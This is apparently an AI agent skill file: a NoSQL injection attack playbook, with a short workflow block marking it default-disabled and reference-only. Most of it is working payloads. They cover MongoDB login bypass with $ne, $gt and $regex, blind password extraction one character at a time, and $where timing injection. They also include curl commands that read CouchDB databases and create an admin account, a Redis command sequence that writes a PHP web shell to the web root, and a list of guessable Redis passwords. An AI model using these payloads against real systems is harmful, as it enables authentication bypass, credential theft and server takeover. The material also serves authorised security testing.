---
name: nosql-injection
description: >-
  NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse.
---

# SKILL: NoSQL Injection — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: NoSQL injection is fundamentally different from SQL injection. Covers MongoDB operator injection, authentication bypass, blind extraction, aggregation pipeline injection, and Redis/CouchDB specific attacks. Very commonly missed by testers who only know SQLi patterns.

---

## 1. CORE CONCEPT — OPERATOR INJECTION

**SQL Injection** breaks out of string literals.  
**NoSQL Injection** injects **query operators** that change query logic.

MongoDB example — normal query:
```javascript
db.users.find({username: "alice", password: "secret"})
```

Injection via JSON operator:
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
→ Becomes: `find({username:"admin", password:{$gt:""}})` → password > "" → always true!

---

## 2. MONGODB — LOGIN BYPASS

### JSON Body Injection (API with JSON Content-Type)
```json
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### PHP `$_POST` Array Injection (URL-encoded form)
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### Ruby / Python `params` Array Injection
Same as PHP — use bracket notation to inject objects:
```
?username[%24ne]=invalid&password[%24ne]=invalid
```
`%24` = URL-encoded `$`

---

## 3. MONGODB OPERATORS FOR INJECTION

| Operator | Meaning | Use Case |
|---|---|---|
| `$ne` | not equal | `{"password": {"$ne": "x"}}` → always matches |
| `$gt` | greater than | `{"password": {"$gt": ""}}` → all non-empty passwords match |
| `$gte` | greater or equal | Similar to $gt |
| `$lt` | less than | `{"password": {"$lt": "~"}}` → all ASCII match |
| `$regex` | regex match | `{"username": {"$regex": "adm.*"}}` |
| `$where` | JS expression | MOST DANGEROUS — code execution |
| `$exists` | field exists | `{"admin": {"$exists": true}}` |
| `$in` | in array | `{"username": {"$in": ["admin","user"]}}` |

---

## 4. BLIND DATA EXTRACTION VIA $REGEX

Like binary search in SQLi, use `$regex` to extract field values character by character:

```json
// Does admin's password start with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}

// Does admin's password start with 'b'?
{"username": "admin", "password": {"$regex": "^b"}}

// Continue: narrow down each position
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
```

**Response difference**: successful login vs failed login = boolean oracle.

**Automate** with NoSQLMap or custom script with binary search on character set.

---

## 5. MONGODB $WHERE INJECTION (JS EXECUTION)

`$where` evaluates JavaScript in MongoDB context.  
**Can only use current document's fields** — not system access. But allows logic abuse:

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}

// Blind extraction via timing:
{"$where": "if(this.username=='admin'){sleep(5000);return true;}else{return false;}"}

// Regex via JS:
{"$where": "this.username.match(/^adm/) && true"}
```

**Limit**: `$where` doesn't give OS command execution — **server-side JS injection** (not to be confused with command injection).

---

## 6. AGGREGATION PIPELINE INJECTION

When user-controlled data enters `$match` or `$group` stages:

```javascript
// Vulnerable code:
db.collection.aggregate([
  {$match: {category: userInput}},  // userInput = {"$ne": null}
  ...
])
```

Inject operators to bypass:
```json
// Input as object:
{"$ne": null}  → matches all categories
{"$regex": ".*"}  → matches all
```

---

## 7. HTTP PARAMETER POLLUTION FOR NOSQL

Some frameworks (Express.js, PHP) parse repeating parameters as arrays:
```
?filter=value1&filter=value2 → filter = ["value1", "value2"]
```

Use `qs` library parse behavior in Node.js:
```
?filter[$ne]=invalid
→ parsed as: filter = {$ne: "invalid"}
→ NoSQL operator injection
```

---

## 8. COUCHDB ATTACKS

### HTTP Admin API (if exposed)
```bash
# List databases:
curl http://target.com:5984/_all_dbs

# Read all documents in a DB:
curl http://target.com:5984/DATABASE_NAME/_all_docs?include_docs=true

# Create admin account (if anonymous access allowed):
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password"'
```

---

## 9. REDIS INJECTION

Redis exposed (6379) with no auth — command injection via input used in Redis queries:

```
# Via SSRF or direct injection:
SET key "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

**Auth bypass** (older Redis with `requirepass` using simple password):
```
AUTH password
AUTH 123456
AUTH redis
AUTH admin
```

---

## 10. DETECTION PAYLOADS

Send these to any input processed by NoSQL backend:

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', sleep(1000)
1' ; sleep(1000)
{"$gt": ""}
{"$ne": "invalid"}
[$ne]=invalid
[$gt]=
```

**JSON variant** test (change Content-Type to `application/json` if endpoint is form-based):
```json
{"username": "admin", "password": {"$ne": ""}}
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 11. NOSQL VS SQL — KEY DIFFERENCES
- 12. TESTING CHECKLIST
- 13. BLIND NoSQL EXTRACTION AUTOMATION
- 14. AGGREGATION PIPELINE INJECTION
